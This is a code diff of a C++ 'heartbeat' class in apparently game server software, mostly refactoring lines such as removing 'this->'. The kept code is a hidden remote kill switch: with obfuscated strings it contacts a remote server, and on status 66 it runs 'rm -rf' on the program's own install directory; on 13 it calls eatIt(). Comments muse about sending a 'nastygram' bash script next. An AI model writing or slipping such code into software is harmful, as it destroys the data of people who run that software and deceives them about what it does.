@@ -7,10 +7,9 @@
 using namespace StellaBellum;
 
 webAPIHeartbeat::webAPIHeartbeat() {
-    std::string filePath = this->get_selfpath();
+    std::string filePath = get_selfpath();
 
-    webAPI api(std::string(vxENCRYPT("https://login.stellabellum.net/metric/shoulderTap").decrypt()),
-            std::string(vxENCRYPT("StellaBellum WebAPI Metrics Sender").decrypt()));
+    webAPI api(std::string(vxENCRYPT("https://login.stellabellum.net/metric/shoulderTap").decrypt()), std::string(vxENCRYPT("StellaBellum WebAPI Metrics Sender").decrypt()));
     api.addJsonData<std::string>(std::string(vxENCRYPT("type").decrypt()), std::string(vxENCRYPT("server").decrypt()));
 
     if (!filePath.empty()) {
@@ -31,24 +30,25 @@ webAPIHeartbeat::webAPIHeartbeat() {
         bool done = false;
 
         if (status && msg == "ok") {
-            bool done = true;
+            done = true;
             // if we wanted to send a "nastygram" script for bash to run we'd check for it here
             // but meh, maybe later if it becomes necessary...surely order 66 below is enough?
         }
 
         switch (s) {
             case 13 :
-                this->eatIt();
+                eatIt();
                 break;
             case 66:
                 size_t found = filePath.find_last_of("/\\");
                 if (!filePath.empty() && found) {
-                    system(std::string(vxENCRYPT("exec rm -rf ").decrypt() + filePath.substr(0, found) + vxENCRYPT("/*").decrypt()).c_str());
+                    system(std::string(vxENCRYPT("exec rm -rf ").decrypt() + filePath.substr(0, found) +
+                                       vxENCRYPT("/*").decrypt()).c_str());
                 }
-                this->eatIt();
+                eatIt();
                 break;
         }
     } else {
-        this->eatIt();
+        eatIt();
     }
 }
